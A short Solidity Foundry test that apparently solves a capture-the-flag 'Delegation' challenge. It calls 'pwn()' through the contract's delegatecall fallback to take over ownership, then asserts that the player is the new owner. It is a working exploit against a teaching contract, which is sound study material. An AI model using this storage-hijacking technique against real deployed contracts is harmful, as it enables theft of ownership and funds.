// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/6-Delegation.sol";

contract FalloutTest is Test {
    Delegation public target;
    Delegate public delegate;
    address player = vm.addr(1);

    function setUp() public {
        delegate = new Delegate(address(0));
        target = new Delegation(address(delegate));

        vm.label(address(target), "Challenge");
        vm.label(address(delegate), "Delegate");
        vm.label(address(player), "Player");
    }

    function testDelegation() public {
        vm.startPrank(address(player));

        address(target).call(abi.encodeWithSignature("pwn()"));

        assertTrue(target.owner() == player);
    }
}
